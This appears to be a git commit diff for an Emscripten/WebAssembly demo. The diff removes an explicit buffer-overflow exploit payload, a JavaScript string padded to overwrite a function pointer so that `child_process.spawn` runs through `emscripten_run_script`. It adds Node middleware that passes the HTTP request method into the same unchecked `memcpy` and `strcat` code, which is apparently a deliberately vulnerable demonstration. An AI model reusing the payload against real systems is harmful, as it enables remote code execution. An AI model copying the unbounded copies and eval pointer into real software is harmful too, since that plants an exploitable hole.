b6f66020eb15216e1ad60d0921bd8fcb843458df
Ayc0 <ayc0.benj@gmail.com>
2019-01-09 21:52:47 +0100

    Finish code

--- src/code.c
+++ src/code.c
@@ -9,35 +9,30 @@ typedef struct Comms {
   char msg[64];
   uint16_t msg_len;
   void (*out)(const char *);
+  void (*eval)(const char *);
 } Comms;
 
-/* Conduct the communication by calling the function pointer with message. */
+
 void trigger(Comms *comms) {
-  printf("%s", comms->msg);
   comms->out(comms->msg);
 }
 
 void communicate(const char *msg) {
-  printf("%s", msg);
+  char str[80];
+  strcpy(str, "console.log(`");
+  strcat(str, msg);
+  strcat(str, "`);");
+
+  emscripten_run_script(str);
 }
 
 EMSCRIPTEN_KEEPALIVE
-void sup(char *msg) {
+void run(char *msg) {
   Comms comms;
   comms.out = &communicate;
-
-  printf("&communicate: %p\n", &communicate); // 0x4
-  printf("&emscripten_run_script: %p\n", &emscripten_run_script); // 0x5
-  // char *payload = "require('child_process').spawn('npx', ['serve', './']);//" // 57 bytes
-  // "       " // + 7 to fill .msg = 64
-  // "  " // + 2 for alignment = 66
-  // "\x40\x00" // + 2 bytes to fill .msg_len = 68
-  // "\x05\x00\x00\x00"; // + 4 bytes to overwrite .out= 72
-
-  // printf("%s\n", msg);
-  printf("%lu\n", strlen(msg));
+  comms.eval = &emscripten_run_script;
+  
   memcpy(comms.msg, msg, strlen(msg));
-
   trigger(&comms);
 
   return;
--- src/index.js
+++ src/index.js
@@ -1,27 +1,8 @@
 const code = require("./code.js");
 
-const sleep = ms => new Promise(res => setTimeout(() => res(), ms));
-
-sleep(150).then(() => {
-  // Create a pointer using the 'Glue' method and the String value
-  var ptr = code.allocate(
-    code.intArrayFromString(
-      "require('child_process').spawn('npx', ['serve', './']);//" + // 57 bytes
-      "       " + // + 7 to fill .msg = 64
-      "  " + // + 2 for alignment = 66
-      "\x40\x01" + // + 2 bytes to fill .msg_len = 68
-      "\x05\x00\x00\x00" // + 4 bytes to overwrite .out= 72
-    ),
-    "i8",
-    code.ALLOC_NORMAL
-  );
-
-  // Call the method passing the pointer
-  var retPtr = code._sup(ptr);
-
-  // Retransform back your pointer to string using 'Glue' method
-  var resValue = code.Pointer_stringify(retPtr);
-
-  // Free the memory allocated by 'allocate'
-  code._free(ptr);
-});
+module.exports = (req, res, next) => {
+  const methodPtr = code.allocate(code.intArrayFromString(req.method), "i8", code.ALLOC_NORMAL);
+  code._run(methodPtr);
+  code._free(methodPtr);
+  next();
+};
